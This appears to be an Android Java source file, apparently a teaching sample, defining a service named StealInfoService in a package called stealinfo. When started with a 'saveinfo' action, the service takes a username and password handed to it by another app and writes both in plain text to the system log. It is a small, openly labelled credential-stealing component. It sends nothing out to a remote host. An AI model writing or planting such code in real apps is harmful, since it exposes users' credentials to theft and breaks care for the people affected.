package com.droider.stealinfo;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class StealInfoService extends Service {	 
	private static final String TAG = "com.droider.stealinfo";
	@Override
	public void onCreate() {
		super.onCreate();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		if (intent.getAction().equals("com.droider.saveinfo")) {
			String username = intent.getExtras().getString("username");
			String password = intent.getExtras().getString("password");
			Log.d(TAG, "StealInfoService:" + username + " -> " + password);			
		}	
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}